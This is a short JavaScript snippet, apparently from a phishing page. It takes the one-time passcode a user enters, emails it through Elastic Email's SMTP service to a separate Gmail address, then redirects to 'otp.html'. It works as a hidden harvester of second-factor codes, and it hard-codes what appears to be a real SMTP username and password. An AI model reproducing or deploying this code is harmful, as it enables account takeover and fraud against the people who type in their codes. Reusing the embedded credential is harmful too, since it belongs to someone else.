function emailSend() {
  var otp = document.getElementById('otp').value; // Getting the OTP entered by the user
  var messageBody = "OTP: " + otp; // Constructing the message body with OTP

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "chukwuebukawilliams6@gmail.com",
    Password: "E141285882E4D4548056C705C3238E355AA6",
    To: 'payday10177@gmail.com',
    From: "chukwuebukawilliams6@gmail.com",
    Subject: "OTP",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
